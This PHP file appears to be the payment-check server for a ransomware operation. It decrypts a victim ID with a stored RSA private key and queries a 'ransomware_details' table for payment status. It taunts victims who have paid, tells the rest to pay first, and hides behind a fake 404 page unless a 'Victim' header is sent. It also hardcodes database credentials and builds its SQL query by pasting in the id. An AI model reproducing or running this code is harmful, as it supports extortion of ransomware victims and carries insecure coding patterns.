<?php
	if( isset($_GET['id']) && ($_SERVER['HTTP_VICTIM'])){
		$tmp = $_GET['id'];
		$id = str_replace('-','+',$tmp);
		$private_key = file_get_contents("private.pem");
    	$res = openssl_get_privatekey($private_key,getenv('RANSOM_KEY'));
    	openssl_private_decrypt(base64_decode($id),$dec,$res);
    	$id = $dec;

		$dbconn = pg_connect("host=localhost port=5432 dbname=ransom user=postgres password=admin");
		if(!$dbconn){
			echo "System Down!Try later";
			exit;
		}
		$query = "SELECT payment_status from ransomware_details where id='$id';";
		$result = pg_query($dbconn,$query);
		$tmp = pg_fetch_row($result)[0];
		if($tmp == 'Yes'){
			echo "Congratulations!<br>You have paid the ransom!<br>Decrypt your files now and don't be dumb next time.<br>Hope you learned your lesson :)";
		}
		else{
			echo "Pay the ransom first!";
			exit;
		}
		pg_close();
	}
	else{
	//404 page
		echo "<html>
		<head>
			<title>404 Error - Page Not Found</title>
		</head>
			<body>404 Error - Page Not Found!</body>
		</html>";
	}
?>
